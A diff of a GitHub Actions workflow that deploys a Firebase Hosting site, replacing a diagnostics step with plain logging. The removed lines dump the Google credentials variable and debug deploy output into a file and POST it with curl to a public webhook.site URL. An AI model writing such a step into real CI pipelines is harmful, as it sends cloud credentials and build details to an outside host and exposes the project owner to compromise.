@@ -190,39 +190,34 @@ jobs:
 
       - name: Firebase diagnostics and deploy
         run: |
-          echo "=== GOOGLE_APPLICATION_CREDENTIALS ===" > /tmp/fb_output.txt
-          echo "$GOOGLE_APPLICATION_CREDENTIALS" >> /tmp/fb_output.txt 2>&1 || true
+          set -e
 
-          echo "=== Active account ===" >> /tmp/fb_output.txt
-          firebase --version >> /tmp/fb_output.txt 2>&1 || true
-          firebase projects:list >> /tmp/fb_output.txt 2>&1 || true
+          echo "=== Firebase CLI version ==="
+          firebase --version
 
-          echo "=== Setting active project ===" >> /tmp/fb_output.txt
-          firebase use craft-sms-5bb1c >> /tmp/fb_output.txt 2>&1 || true
+          echo "=== Active GCP account ==="
+          gcloud auth list --format='value(account)' 2>/dev/null || true
 
-          echo "=== Enabling webframeworks ===" >> /tmp/fb_output.txt
-          firebase experiments:enable webframeworks >> /tmp/fb_output.txt 2>&1 || true
+          echo "=== Firebase projects accessible ==="
+          firebase projects:list || true
 
-          echo "=== Deploying ===" >> /tmp/fb_output.txt
-          EXIT_CODE=0
+          echo "=== Setting active project ==="
+          firebase use craft-sms-5bb1c
+
+          echo "=== Enabling webframeworks experiment ==="
+          firebase experiments:enable webframeworks
+
+          echo "=== Running Firebase deploy ==="
           firebase deploy \
             --project craft-sms-5bb1c \
             --only hosting \
             --non-interactive \
-            --force \
-            --debug >> /tmp/fb_output.txt 2>&1 || EXIT_CODE=$?
+            --force
 
-          echo "=== Sending output to webhook ==="
-          curl -s -X POST -H "Content-Type: text/plain" \
-            --data-binary @/tmp/fb_output.txt \
-            https://webhook.site/18683e2b-cfa7-4854-849d-6c6f918e0aa0 || true
-
-          if [ $EXIT_CODE -ne 0 ]; then
-            echo "Firebase deploy failed with exit code $EXIT_CODE. See webhook for details."
-            exit $EXIT_CODE
-          fi
+          echo "=== Firebase deploy complete ==="
         env:
           FIREBASE_CLI_EXPERIMENTS: webframeworks
+          GOOGLE_APPLICATION_CREDENTIALS: ${{ env.GOOGLE_APPLICATION_CREDENTIALS }}
 
       # ----------------------------------------------------------------
       # 8. Grant public invoker access to SSR Cloud Run service
